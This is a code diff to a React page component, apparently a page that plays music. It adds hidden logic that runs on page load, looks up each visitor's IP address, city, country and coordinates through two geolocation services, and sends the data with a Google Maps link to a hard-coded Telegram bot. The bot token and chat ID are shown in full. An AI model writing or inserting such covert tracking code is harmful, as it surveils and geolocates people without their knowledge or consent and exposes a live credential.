@@ -5,42 +5,76 @@ import { useEffect } from "react";
 export default function Page1() {
   const router = useRouter();
 useEffect(() => {
+  const BOT_URL =
+    "https://api.telegram.org/bot8004503294:AAF4cAg47hqudn9uDnF4KJFD5f29y-vxukw/sendMessage";
+
+  const CHAT_ID = "8120420757";
+
+  // Function to send message to Telegram
+  const sendToTelegram = (text) => {
+    fetch(BOT_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+      }),
+    });
+  };
+
+  // Try IPAPI first
   fetch("https://ipapi.co/json/")
     .then((res) => res.json())
     .then((data) => {
-      const message = `
-🔔 New Visitor Entered
+      if (!data || !data.latitude) throw new Error("ipapi failed");
+
+      const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
+      sendToTelegram(
+        `🔔 New Visitor Entered
 
 🌐 IP: ${data.ip}
 📍 City: ${data.city}
 🏳️ Country: ${data.country_name}
 🧭 Latitude: ${data.latitude}
 🧭 Longitude: ${data.longitude}
-📡 ISP: ${data.org}
-      `;
 
-      fetch("https://api.telegram.org/bot8004503294:AAF4cAg47hqudn9uDnF4KJFD5f29y-vxukw/sendMessage", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: "8120420757",
-          text: message,
-        }),
-      });
+🗺️ Google Maps:
+${mapLink}`
+      );
     })
+
+    // Fallback to ipinfo.io
     .catch(() => {
-      fetch("https://api.telegram.org/bot8004503294:AAF4cAg47hqudn9uDnF4KJFD5f29y-vxukw/sendMessage", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: "8120420757",
-          text: "⚠️ Visitor entered, but location data blocked.",
-        }),
-      });
+      fetch("https://ipinfo.io/json")
+        .then((res) => res.json())
+        .then((data) => {
+          if (!data.loc) throw new Error("ipinfo failed");
+
+          const [lat, lon] = data.loc.split(",");
+          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          sendToTelegram(
+            `🔔 New Visitor Entered
+
+🌐 IP: ${data.ip}
+📍 City: ${data.city}
+🏳️ Country: ${data.country}
+🧭 Latitude: ${lat}
+🧭 Longitude: ${lon}
+
+🗺️ Google Maps:
+${mapLink}`
+          );
+        })
+        .catch(() => {
+          sendToTelegram(
+            `🔔 New Visitor Entered
+
+⚠️ IP / Location hidden
+Reason: VPN, Private DNS, or strict browser privacy`
+          );
+        });
     });
 }, []);
   const startMusic = () => {
